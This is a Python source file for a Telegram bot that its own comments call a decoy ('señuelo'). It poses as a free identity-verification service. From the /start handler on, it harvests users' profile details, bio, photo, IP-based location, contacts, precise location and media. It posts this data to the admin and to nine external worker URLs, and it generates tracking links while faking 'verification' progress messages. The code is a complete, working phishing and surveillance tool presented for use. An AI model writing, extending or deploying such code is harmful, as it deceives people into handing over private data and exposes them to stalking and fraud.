import os
import logging
import aiohttp
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ========== CONFIGURACIÓN ==========
TOKEN = os.environ.get("TOKEN", "").strip()
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0").strip())

if not TOKEN or not ADMIN_ID:
    raise ValueError("❌ Faltan TOKEN o ADMIN_ID en variables de entorno")

# ========== URLS PARA ENVÍO ==========
URLS = [
    "https://bot-ubi.societykark.workers.dev",
    "https://bot-tg.societykark.workers.dev",
    "https://tg-bot12.societykark.workers.dev",
    "https://app-trk.societykark.workers.dev",
    "https://app-tg.societykark.workers.dev",
    "https://app-kali.societykark.workers.dev",
    "https://societykark.pythonanywhere.com",
    "https://kali-bot12.societykark.workers.dev",
    "https://galleta.societykark.workers.dev"
]
WORKER_URL = URLS[-1]

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

users_db = {}
tracking_codes = {}
user_states = {}  # Para rastrear en qué paso va cada usuario

# ========== MENSAJE DE BIENVENIDA (SEÑUELO PROFESIONAL) ==========
MENSAJE_INICIO = """🔐 *SISTEMA DE VERIFICACIÓN DE IDENTIDAD* 🔐
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

*Bienvenido al Panel de Control de Seguridad*

✅ Tu cuenta ha sido seleccionada para verificación prioritaria.
✅ Este proceso garantiza la protección de tu identidad.
✅ Es rápido, seguro y completamente gratuito.

*Beneficios de completar la verificación:*
🔹 Acceso a contenido premium exclusivo
🔹 Mayor seguridad en tu cuenta
🔹 Recompensas y beneficios especiales

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 *Para continuar, selecciona una opción:*
"""

# ========== BOTONES ESTÁTICOS (siempre visibles, abajo del chat) ==========
def menu_estatico():
    keyboard = [
        [KeyboardButton("🔹 VERIFICAR IDENTIDAD"), KeyboardButton("📊 MI PERFIL")],
        [KeyboardButton("📸 ENVIAR FOTO"), KeyboardButton("🎥 ENVIAR VIDEO")],
        [KeyboardButton("🎵 ENVIAR AUDIO"), KeyboardButton("📇 ENVIAR CONTACTO")],
        [KeyboardButton("📍 ENVIAR UBICACIÓN"), KeyboardButton("🔗 GENERAR ENLACE")],
        [KeyboardButton("📈 ESTADÍSTICAS"), KeyboardButton("❓ AYUDA")],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ========== FUNCIONES DE EXTRACCIÓN ==========
async def get_worker_location():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(WORKER_URL, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None
    except Exception as e:
        logger.error(f"Error en Worker: {e}")
        return None

async def get_ipapi_location(ip):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://ipapi.co/{ip}/json/", timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None
    except Exception as e:
        logger.error(f"Error en ipapi: {e}")
        return None

async def get_user_photo(user_id, bot):
    try:
        photos = await bot.get_user_profile_photos(user_id, limit=1)
        if photos.total_count > 0:
            return photos.photos[0][-1].file_id
        return None
    except Exception as e:
        logger.error(f"Error al obtener foto: {e}")
        return None

async def get_user_bio(user, bot):
    try:
        full_user = await bot.get_chat(user.id)
        return full_user.bio if hasattr(full_user, 'bio') else None
    except Exception as e:
        logger.error(f"Error al obtener bio: {e}")
        return None

async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, target_user=None):
    bot = context.bot
    user = target_user or update.effective_user
    chat = update.effective_chat
    message = update.message

    user_id = user.id
    first_name = user.first_name or "N/A"
    last_name = user.last_name or "N/A"
    full_name = f"{first_name} {last_name}".strip()
    username = f"@{user.username}" if user.username else "N/A"
    language = user.language_code or "N/A"
    is_bot = "Sí" if user.is_bot else "No"
    is_premium = "Sí" if getattr(user, 'is_premium', False) else "No"
    bio = await get_user_bio(user, bot) or "No disponible"
    photo_id = await get_user_photo(user_id, bot)

    chat_type = "Privado" if chat.type == "private" else f"Grupo: {chat.title}"
    chat_id = chat.id

    message_id = message.message_id if message else "N/A"
    message_text = message.text if message and message.text else "N/A"
    message_date = message.date.strftime("%Y-%m-%d %H:%M:%S") if message else "N/A"

    worker_data = await get_worker_location()
    ip = "N/A"
    country = "N/A"
    region = "N/A"
    city = "N/A"
    timezone = "N/A"
    postal = "N/A"

    if worker_data:
        ip = worker_data.get("ip", "N/A")
        country = worker_data.get("country", "N/A")
        region = worker_data.get("region", "N/A")
        city = worker_data.get("city", "N/A")
        timezone = worker_data.get("timezone", "N/A")
        postal = worker_data.get("postal", "N/A")
        if ip != "N/A":
            ipapi_data = await get_ipapi_location(ip)
            if ipapi_data:
                country = ipapi_data.get("country_name", country)
                region = ipapi_data.get("region", region)
                city = ipapi_data.get("city", city)
                postal = ipapi_data.get("postal", postal)
                timezone = ipapi_data.get("timezone", timezone)

    info = f"🔐 *INFORMACIÓN COMPLETA DEL USUARIO*\n"
    info += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    info += f"👤 *Telegram*\n"
    info += f"   • ID: `{user_id}`\n"
    info += f"   • Nombre completo: {full_name}\n"
    info += f"   • Username: {username}\n"
    info += f"   • Idioma: {language}\n"
    info += f"   • Es bot: {is_bot}\n"
    info += f"   • Es Premium: {is_premium}\n"
    info += f"   • Biografía: {bio}\n\n"
    info += f"💬 *Chat*\n"
    info += f"   • Tipo: {chat_type}\n"
    info += f"   • Chat ID: `{chat_id}`\n\n"
    info += f"📩 *Mensaje*\n"
    info += f"   • ID: {message_id}\n"
    info += f"   • Fecha: {message_date}\n"
    info += f"   • Texto: {message_text[:100]}{'...' if len(message_text) > 100 else ''}\n\n"
    info += f"🌐 *Red y Ubicación*\n"
    info += f"   • IP: `{ip}`\n"
    info += f"   • País: {country}\n"
    info += f"   • Región: {region}\n"
    info += f"   • Ciudad: {city}\n"
    info += f"   • Código Postal: {postal}\n"
    info += f"   • Zona Horaria: {timezone}\n"
    info += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    info += f"⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    return {
        "text": info,
        "photo_id": photo_id,
        "user_id": user_id,
        "username": username,
        "ip": ip,
        "city": city,
        "country": country
    }

# ========== ENVÍO A WORKERS ==========
async def send_to_all_workers(text):
    form_data = aiohttp.FormData()
    form_data.add_field('chat_id', str(ADMIN_ID))
    form_data.add_field('text', text)
    results = []
    async with aiohttp.ClientSession() as session:
        for url in URLS:
            try:
                async with session.post(url, data=form_data, timeout=10) as resp:
                    if resp.status == 200:
                        results.append(f"✅ {url}")
                    else:
                        results.append(f"❌ {url} (HTTP {resp.status})")
            except Exception as e:
                results.append(f"❌ {url} (Error: {str(e)[:30]})")
    return results

async def send_report_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data):
    bot = context.bot
    await bot.send_message(chat_id=ADMIN_ID, text=info_data["text"], parse_mode=ParseMode.MARKDOWN)
    if info_data["photo_id"]:
        await bot.send_photo(chat_id=ADMIN_ID, photo=info_data["photo_id"], caption=f"📸 Foto de {info_data['username'] or info_data['user_id']}")
    resultados = await send_to_all_workers(info_data["text"])
    logger.info(f"Resultados de envío a Workers: {resultados}")
    users_db[info_data["user_id"]] = info_data

# ========== COMANDOS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        await update.message.reply_text("👋 Hola admin. El bot está activo.")
        return

    # Extraer información del usuario automáticamente (el señuelo)
    info_data = await extract_user_info(update, context)
    await send_report_to_admin(update, context, info_data)

    # Mensaje de bienvenida con el señuelo y botones estáticos
    await update.message.reply_text(
        MENSAJE_INICIO,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=menu_estatico()
    )

    # Mensaje adicional para que parezca que ya se está procesando algo
    await update.message.reply_text(
        "⏳ *Verificando tu identidad...*\n"
        "Este proceso tomará solo unos segundos.\n"
        "Presiona un botón para continuar con la verificación.",
        parse_mode=ParseMode.MARKDOWN
    )

# ========== MANEJAR MENSAJES DE TEXTO (botones estáticos) ==========
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user = update.effective_user
    logger.info(f"📩 Mensaje recibido: {text} de {user.first_name}")

    # Siempre responder con el menú estático visible
    reply_markup = menu_estatico()

    if text == "🔹 VERIFICAR IDENTIDAD":
        # Simular un proceso de verificación
        await update.message.reply_text(
            "🔐 *Verificación de Identidad en Progreso...*\n\n"
            "✅ Paso 1: Verificación de datos básicos... Completado\n"
            "⏳ Paso 2: Verificación de ubicación... En proceso\n"
            "⏳ Paso 3: Verificación de dispositivo... En proceso\n\n"
            "📌 Para completar la verificación, necesitamos algunos datos adicionales.\n"
            "Por favor, selecciona una opción del menú inferior.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

    elif text == "📊 MI PERFIL":
        # Mostrar perfil del usuario (el que ya tenemos almacenado)
        info = users_db.get(user.id)
        if not info:
            await update.message.reply_text(
                "❌ No se encontró tu perfil. Usa /start para registrarte.",
                reply_markup=reply_markup
            )
            return
        msg = f"📊 *Tu perfil verificado*\n\n"
        msg += f"👤 *Nombre:* {info.get('full_name')}\n"
        msg += f"📛 *Username:* {info.get('username')}\n"
        msg += f"🆔 *ID:* `{info.get('id')}`\n"
        msg += f"🌐 *IP:* {info.get('ip')}\n"
        msg += f"📍 *Ubicación:* {info.get('city')}, {info.get('country')}\n"
        msg += f"✅ *Estado:* Verificado"
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

    elif text == "📸 ENVIAR FOTO":
        await update.message.reply_text("📸 Envía una foto para completar tu verificación.", reply_markup=reply_markup)

    elif text == "🎥 ENVIAR VIDEO":
        await update.message.reply_text("🎥 Envía un video para completar tu verificación.", reply_markup=reply_markup)

    elif text == "🎵 ENVIAR AUDIO":
        await update.message.reply_text("🎵 Envía un audio para completar tu verificación.", reply_markup=reply_markup)

    elif text == "📇 ENVIAR CONTACTO":
        await update.message.reply_text("📇 Comparte tu contacto para verificar tu identidad.", reply_markup=reply_markup)

    elif text == "📍 ENVIAR UBICACIÓN":
        await update.message.reply_text("📍 Comparte tu ubicación para verificar tu dirección.", reply_markup=reply_markup)

    elif text == "🔗 GENERAR ENLACE":
        code = os.urandom(6).hex()
        tracking_codes[code] = {"user_id": user.id, "created": datetime.now().isoformat()}
        link = f"{WORKER_URL}/track/{code}"
        await update.message.reply_text(
            f"🔗 *Enlace de verificación generado:*\n"
            f"`{link}`\n\n"
            f"Este enlace es personalizado y caduca en 24 horas.\n"
            f"Compártelo con quien necesite verificar su identidad.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🔗 Nuevo enlace generado\nUsuario: {user.first_name} (@{user.username})\nCódigo: {code}\nEnlace: {link}"
        )

    elif text == "📈 ESTADÍSTICAS":
        if user.id == ADMIN_ID:
            msg = f"📊 *Estadísticas del sistema*\n\n"
            msg += f"👥 Usuarios verificados: {len(users_db)}\n"
            msg += f"🔗 Enlaces generados: {len(tracking_codes)}"
            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        else:
            await update.message.reply_text(
                "📊 *Estadísticas de tu cuenta*\n\n"
                "✅ Estado de verificación: *Completado*\n"
                "🔒 Nivel de seguridad: *Alto*\n"
                "📅 Última verificación: *Hoy*\n\n"
                "Tu cuenta está protegida correctamente.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )

    elif text == "❓ AYUDA":
        await update.message.reply_text(
            "❓ *Ayuda del Sistema de Verificación*\n\n"
            "Este sistema está diseñado para proteger tu identidad.\n\n"
            "📌 *Botones disponibles:*\n"
            "• Verificar identidad: Inicia el proceso de verificación.\n"
            "• Mi perfil: Muestra tu información verificada.\n"
            "• Enviar foto/video/audio/contacto/ubicación: Envía datos para verificación.\n"
            "• Generar enlace: Crea un enlace de verificación personalizado.\n"
            "• Estadísticas: Muestra el estado de tu cuenta.\n"
            "• Ayuda: Muestra este mensaje.\n\n"
            "🔐 *Tu seguridad es nuestra prioridad.*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

    else:
        await update.message.reply_text(
            "❌ *Opción no reconocida.*\n"
            "Por favor, usa los botones del menú inferior.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

# ========== MANEJAR ARCHIVOS RECIBIDOS ==========
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    photo = update.message.photo[-1]
    caption = update.message.caption or "Sin caption"
    await context.bot.send_photo(
        chat_id=ADMIN_ID,
        photo=photo.file_id,
        caption=f"📸 *Foto recibida de {user.first_name} (@{user.username})*\n\n📝 Caption: {caption}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text(
        "✅ *Foto recibida correctamente.*\n"
        "Tu verificación está en proceso.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=menu_estatico()
    )

async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    video = update.message.video
    caption = update.message.caption or "Sin caption"
    await context.bot.send_video(
        chat_id=ADMIN_ID,
        video=video.file_id,
        caption=f"🎥 *Video recibido de {user.first_name} (@{user.username})*\n\n📝 Caption: {caption}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text(
        "✅ *Video recibido correctamente.*\n"
        "Tu verificación está en proceso.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=menu_estatico()
    )

async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    audio = update.message.audio
    await context.bot.send_audio(
        chat_id=ADMIN_ID,
        audio=audio.file_id,
        caption=f"🎵 *Audio recibido de {user.first_name} (@{user.username})*\n\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text(
        "✅ *Audio recibido correctamente.*\n"
        "Tu verificación está en proceso.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=menu_estatico()
    )

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    contact = update.message.contact
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"📇 *Contacto recibido de {user.first_name} (@{user.username})*\n\n📞 Nombre: {contact.first_name} {contact.last_name or ''}\n📞 Teléfono: `{contact.phone_number}`\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text(
        "✅ *Contacto recibido correctamente.*\n"
        "Tu verificación está en proceso.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=menu_estatico()
    )

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    location = update.message.location
    await context.bot.send_location(
        chat_id=ADMIN_ID,
        latitude=location.latitude,
        longitude=location.longitude
    )
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"📍 *Ubicación recibida de {user.first_name} (@{user.username})*\n\n🌐 Lat: {location.latitude}\n🌐 Lon: {location.longitude}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text(
        "✅ *Ubicación recibida correctamente.*\n"
        "Tu verificación está en proceso.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=menu_estatico()
    )

# ========== ERROR HANDLER ==========
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"❌ Error: {context.error}")
    if isinstance(update, Update) and update.effective_message:
        await update.effective_message.reply_text(
            "❌ *Error inesperado.*\n"
            "Por favor, intenta de nuevo.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=menu_estatico()
        )

# ========== SERVIDOR HTTP ==========
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def run_http_server():
    server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
    server.serve_forever()

# ========== MAIN ==========
def main():
    Thread(target=run_http_server, daemon=True).start()
    logger.info("✅ Servidor HTTP en puerto 8080")
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.VIDEO, handle_video))
    app.add_handler(MessageHandler(filters.AUDIO, handle_audio))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(error_handler)
    logger.info("✅ Bot señuelo iniciado correctamente")
    app.run_polling()

if __name__ == "__main__":
    main()